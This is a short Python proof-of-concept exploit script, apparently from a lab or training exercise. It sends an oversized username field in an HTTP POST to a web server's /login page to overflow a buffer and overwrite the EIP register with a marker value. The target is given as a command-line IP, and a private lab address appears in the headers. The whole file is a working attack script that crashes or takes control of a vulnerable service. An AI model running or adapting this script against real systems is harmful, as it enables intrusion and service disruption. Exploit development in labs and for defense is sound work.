#!/usr/bin/env python3
import socket
import sys

# POC buffer
buf = b"A" * 780
eip = b"B" * 4
filler = b"C" *16

inputBuffer = buf + eip + filler

body = b"username=" + inputBuffer + b"&password=A"

req = b"POST /login HTTP/1.1\r\n"
req += b"Host: 192.168.208.131\r\n"
req += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += b"Accept-Language: en-US,en;q=0.5\r\n"
req += b"Referer: http://192.168.208.131/login\r\n"
req += b"Connection: close\r\n"
req += b"Content-Type: application/x-www-form-urlencoded\r\n"
req += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
req += b"\r\n"
req += body

if len(sys.argv) < 2:
    print("Usage: ./poc.py <target-IP>")
    exit()

print('[+] Sending payload...')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 80))
s.send(req)
s.close()
print('[+] Payload sent.')